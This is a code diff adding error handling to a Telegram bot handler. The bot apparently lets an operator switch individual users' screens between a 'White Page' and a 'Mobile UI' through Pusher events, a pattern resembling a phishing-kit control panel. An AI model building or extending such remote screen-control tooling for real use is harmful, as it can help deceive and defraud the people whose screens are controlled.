@@ -186,23 +186,39 @@ Available Commands:
 
         if (action.startsWith('ctrl_')) {
             const user = action.replace('ctrl_', '');
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: chatId,
-                    text: `📱 *CONTROL:* \`${user}\`\nSelect screen:`,
-                    parse_mode: 'Markdown',
-                    reply_markup: {
-                        inline_keyboard: [
-                            [
-                                { text: '⚪ White Page', callback_data: `set_white_${user}` },
-                                { text: '📱 Mobile UI', callback_data: `set_mobile_${user}` }
+            try {
+                const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: `📱 *CONTROL:* \`${user}\`\nSelect screen:`,
+                        parse_mode: 'Markdown',
+                        reply_markup: {
+                            inline_keyboard: [
+                                [
+                                    { text: '⚪ White Page', callback_data: `set_white_${user}` },
+                                    { text: '📱 Mobile UI', callback_data: `set_mobile_${user}` }
+                                ]
                             ]
-                        ]
-                    }
-                })
-            });
+                        }
+                    })
+                });
+
+                if (!res.ok) {
+                    const errData = await res.json();
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: chatId,
+                            text: `❌ API Error: ${errData.description}`
+                        })
+                    });
+                }
+            } catch (err) {
+                console.error("Fetch error:", err);
+            }
         } 
         else if (action.startsWith('set_')) {
             const isWhite = action.startsWith('set_white_');
@@ -217,7 +233,7 @@ Available Commands:
                 await pusher.trigger(`user-${user}`, 'screen-change', { state: state });
 
                 // 3. Notify admin
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
@@ -226,6 +242,18 @@ Available Commands:
                         parse_mode: 'Markdown'
                     })
                 });
+
+                if (!res.ok) {
+                    const errData = await res.json();
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: chatId,
+                            text: `❌ API Error: ${errData.description}`
+                        })
+                    });
+                }
             } catch (err) {
                 // Notify admin about the error so it doesn't fail silently
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
